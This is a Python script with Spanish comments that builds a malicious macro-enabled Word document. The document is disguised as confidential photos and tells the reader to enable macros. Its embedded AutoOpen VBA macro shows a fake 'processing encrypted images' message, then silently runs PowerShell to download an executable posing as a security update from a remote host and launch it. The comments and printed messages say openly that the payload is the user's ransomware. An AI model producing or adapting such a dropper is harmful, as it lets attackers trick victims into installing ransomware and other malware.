import os
import sys
import win32com.client
import pythoncom

class WordMacroCreator:
    def __init__(self):
        self.macro_name = "AutoOpen"
    
    def create_malicious_word(self, output_file="documento_fotos.docm"):
        """
        Crea documento Word (.docm) que ejecuta código al abrirse.
        """
        print("[*] Creando documento Word con macros...")
        
        # Inicializar COM
        pythoncom.CoInitialize()
        
        try:
            # 1. Iniciar Word
            word = win32com.client.Dispatch("Word.Application")
            word.Visible = False
            word.DisplayAlerts = False
            
            # 2. Crear documento nuevo
            doc = word.Documents.Add()
            
            # 3. Añadir contenido que ve el usuario
            doc.Content.Text = (
                "FOTOS CONFIDENCIALES - REVISIÓN INTERNA\n\n"
                "Este documento contiene imágenes protegidas.\n"
                "HABILITE LAS MACROS para ver el contenido.\n\n"
                "Departamento de Comunicaciones\n"
                "Documento ID: INT-PHOTO-001"
            )
            
            # 4. Añadir código VBA (esto se ejecuta al abrir)
            vba_code = '''Sub AutoOpen()
                            On Error Resume Next
    
                            ' Mensaje falso
                            MsgBox "Procesando imágenes encriptadas...", vbInformation
    
                            ' Ejecutar código en segundo plano
                            Call ExecutePayload
    
                            ' Marcar como guardado
                            ThisDocument.Saved = True
                        End Sub

                        Sub ExecutePayload()
                            ' Crear objeto para ejecutar comandos
                            Dim shell As Object
                            Set shell = CreateObject("WScript.Shell")
    
                            ' Comando para ejecutar (aquí va tu ransomware)
                            ' MODIFICA ESTA RUTA con la ubicación de tu ransomware.exe
                            ' shell.Run "cmd /c C:\\Windows\\Temp\\ransomware.exe", 0, False
    
                            ' O usar PowerShell para descargar de internet
                            shell.Run "powershell -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri http://192.168.1.137:8000/security_update.exe -OutFile $env:TEMP\security_update.exe; Start-Process $env:TEMP\security_update.exe""", 0, False
    
                            Set shell = Nothing
                        End Sub'''
            
            # 5. Insertar el código VBA
            vb_component = doc.VBProject.VBComponents.Add(1)
            vb_component.Name = "Module1"
            vb_component.CodeModule.AddFromString(vba_code)
            
            # 6. Guardar como .docm (con macros)
            doc.SaveAs(
                FileName=os.path.abspath(output_file),
                FileFormat=13,  # wdFormatXMLDocumentMacroEnabled
                AddToRecentFiles=False
            )
            
            # 7. Cerrar
            doc.Close(SaveChanges=False)
            word.Quit()
            
            print(f"[+] Documento creado: {output_file}")
            print("[+] Al abrirlo, Word mostrará: 'Habilitar contenido'")
            print("[+] Si el usuario habilita macros, ejecutará tu ransomware")
            
        except Exception as e:
            print(f"[!] Error: {e}")
            print("[!] Necesitas:")
            print("    1. Microsoft Word instalado")
            print("    2. Habilitar 'Confiar en acceso al modelo de objetos VBA'")
            print("    3. (Opcional) Ejecutar como administrador")
        finally:
            pythoncom.CoUninitialize()

# Uso
if __name__ == "__main__":
    creator = WordMacroCreator()
    creator.create_malicious_word()